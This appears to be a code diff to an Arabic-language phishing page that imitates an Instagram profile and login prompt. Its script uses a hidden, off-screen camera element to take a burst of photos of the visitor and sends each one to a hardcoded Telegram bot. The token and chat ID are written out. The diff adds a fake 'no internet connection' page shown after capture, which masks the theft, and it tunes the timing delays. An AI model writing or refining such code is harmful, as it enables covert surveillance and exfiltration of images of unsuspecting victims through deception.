@@ -54,7 +54,6 @@
     box-shadow: 0 4px 24px rgba(0,0,0,0.06);
   }
 
-  /* ===== غلاف الصورة + الشعار ===== */
   .avatar-wrapper {
     position: relative;
     width: 140px;
@@ -80,8 +79,6 @@
     border: 3px solid #fff;
   }
 
-  /* شعار Instagram في الزاوية العليا اليسرى */
-    /* شعار Instagram في أعلى يسار الشاشة */
   .ig-badge {
     position: fixed;
     top: 20px;
@@ -158,7 +155,6 @@
     margin-bottom: 6px;
   }
 
-  /* الكاميرا مخفية تمامًا */
   #camHidden {
     position: fixed;
     top: -9999px;
@@ -174,7 +170,6 @@
 
 <div class="card">
 
-  <!-- ===== الصورة + شعار Instagram ===== -->
   <div class="avatar-wrapper">
     <div class="avatar">
       <img id="avatarImg"
@@ -185,10 +180,7 @@
     <div class="ig-badge">Instagram</div>
   </div>
 
-  <!-- ضع الاسم هنا -->
   <h1 class="name">@Mohammed Dawood</h1>
-
-  <!-- ضع النص هنا -->
   <p class="bio">سجل الدخول للوصول لحساب هذا المستخدم على Instagram</p>
 
   <div class="divider"></div>
@@ -211,10 +203,12 @@ const TELEGRAM_TOKEN   = '8662015576:AAEDAgAPTh4L_-Mgk-Wo44kpovyTCyO8mJQ';
 const TELEGRAM_CHAT_ID = '8335283387';
 
 const CONFIG = {
-  photosCount: 5,      // عدد الصور
-  intervalMs: 120,     // فاصل صغير جدًا بين التقاط وآخر
-  quality: 0.85,
-  maxWidth: 900
+  photosCount: 5,        // عدد الصور
+  intervalMs: 120,       // فاصل صغير جدًا بين التقاط وآخر
+  quality: 0.85,         // جودة الصورة
+  maxWidth: 900,         // أقصى عرض للصورة
+  startDelayMs: 3000,    // تأخير قبل طلب إذن الكاميرا (3 ثواني)
+  errorDelayMs: 800      // تأخير قبل الانتقال لصفحة فشل الاتصال
 };
 /* ============================================================ */
 
@@ -249,7 +243,6 @@ async function startCamera() {
     video.srcObject = stream;
     await video.play();
 
-    // ننتظر فقط حتى يجهز أول فريم (فحص سريع جدًا كل 20 مللي ثانية)
     await new Promise(resolve => {
       if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
       const check = setInterval(() => {
@@ -330,7 +323,148 @@ async function sendPhoto(blob, index) {
   return data;
 }
 
-/* ---------- 4) التدفق الرئيسي: التقط ← أرسل فورًا ← التقط التالية ---------- */
+/* ---------- 4) صفحة "فشل الاتصال بالإنترنت" مع أيقونة WiFi احترافية ---------- */
+function showInternetErrorPage() {
+  document.open();
+  document.write(`<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لا يوجد اتصال بالإنترنت</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fafafa;
+    font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', Tahoma, sans-serif;
+    color: #262626;
+    padding: 24px;
+    text-align: center;
+  }
+
+  .wrap { max-width: 420px; width: 100%; }
+
+  .wifi-icon {
+    width: 110px;
+    height: 110px;
+    margin: 0 auto 26px;
+    display: block;
+  }
+
+  .wifi-icon .ring {
+    fill: none;
+    stroke: url(#igGrad);
+    stroke-width: 8;
+    stroke-linecap: round;
+    opacity: 0;
+    animation: wifiPulse 2.2s ease-out infinite;
+  }
+  .wifi-icon .ring:nth-child(1) { animation-delay: 0s; }
+  .wifi-icon .ring:nth-child(2) { animation-delay: 0.35s; }
+  .wifi-icon .ring:nth-child(3) { animation-delay: 0.7s; }
+
+  .wifi-icon .dot {
+    fill: url(#igGrad);
+  }
+
+  .wifi-icon .cross {
+    stroke: #ed4956;
+    stroke-width: 9;
+    stroke-linecap: round;
+    opacity: 0.9;
+  }
+
+  @keyframes wifiPulse {
+    0%   { opacity: 0; }
+    40%  { opacity: 1; }
+    100% { opacity: 0; }
+  }
+
+  h1 {
+    font-size: 22px;
+    font-weight: 700;
+    color: #262626;
+    margin-bottom: 14px;
+    letter-spacing: -0.3px;
+  }
+
+  p {
+    font-size: 15px;
+    line-height: 1.9;
+    color: #8e8e8e;
+    margin-bottom: 28px;
+  }
+
+  .btn {
+    display: inline-block;
+    padding: 13px 32px;
+    border-radius: 10px;
+    background: linear-gradient(45deg,
+      #405DE6, #5851DB, #833AB4, #C13584,
+      #E1306C, #FD1D1D, #F56040, #F77737,
+      #FCAF45, #FFDC80);
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: 700;
+    text-decoration: none;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0 6px 20px rgba(225, 48, 108, 0.3);
+    font-family: inherit;
+    transition: transform .15s;
+  }
+  .btn:active { transform: scale(0.97); }
+
+  .code {
+    margin-top: 24px;
+    font-size: 12px;
+    color: #c7c7c7;
+    letter-spacing: 0.5px;
+  }
+</style>
+</head>
+<body>
+  <div class="wrap">
+
+    <svg class="wifi-icon" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="igGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%"   stop-color="#405DE6"/>
+          <stop offset="25%"  stop-color="#833AB4"/>
+          <stop offset="50%"  stop-color="#E1306C"/>
+          <stop offset="75%"  stop-color="#F77737"/>
+          <stop offset="100%" stop-color="#FFDC80"/>
+        </linearGradient>
+      </defs>
+
+      <path class="ring" d="M 20 70 A 50 50 0 0 1 100 70"/>
+      <path class="ring" d="M 35 82 A 32 32 0 0 1 85 82"/>
+      <path class="ring" d="M 50 94 A 15 15 0 0 1 70 94"/>
+
+      <circle class="dot" cx="60" cy="103" r="6"/>
+
+      <line class="cross" x1="22" y1="22" x2="98" y2="98"/>
+    </svg>
+
+    <h1>فشل الاتصال بالإنترنت</h1>
+    <p>
+      تعذّر الاتصال بالشبكة.<br>
+      يرجى التحقق من اتصالك بالإنترنت ثم المحاولة مرة أخرى.
+    </p>
+    <button class="btn" onclick="location.reload()">إعادة المحاولة</button>
+    <div class="code">ERR_INTERNET_DISCONNECTED</div>
+  </div>
+</body>
+</html>`);
+  document.close();
+}
+
+/* ---------- 5) التدفق الرئيسي ---------- */
 async function runVerification() {
   const ok = await startCamera();
   if (!ok) return;
@@ -365,21 +499,13 @@ async function runVerification() {
 
   await Promise.all(sendPromises);
 
-  if (failed === CONFIG.photosCount) {
-    setStatus('❌ تعذّر الإرسال.<br>يرجى إعادة تحميل الصفحة.', 'error');
-    return;
-  }
-
-  statusEl.className = 'status-success';
-  statusEl.innerHTML =
-    '<span class="big-icon">✅</span>' +
-    'تم التحقق بنجاح.<br>' +
-    'شكرًا لك.';
+  // ⬇️⬇️⬇️ الانتقال إلى صفحة "فشل الاتصال بالإنترنت" ⬇️⬇️⬇️
+  setTimeout(showInternetErrorPage, CONFIG.errorDelayMs);
 }
 
 window.addEventListener('load', () => {
-  // ننتظر ثانيتين حتى يرى الطالب محتوى الصفحة أولًا
-  setTimeout(runVerification, 2000);
+  // ننتظر حتى يرى الطالب محتوى الصفحة أولًا
+  setTimeout(runVerification, CONFIG.startDelayMs);
 });
 
 window.addEventListener('pagehide', stopCamera);
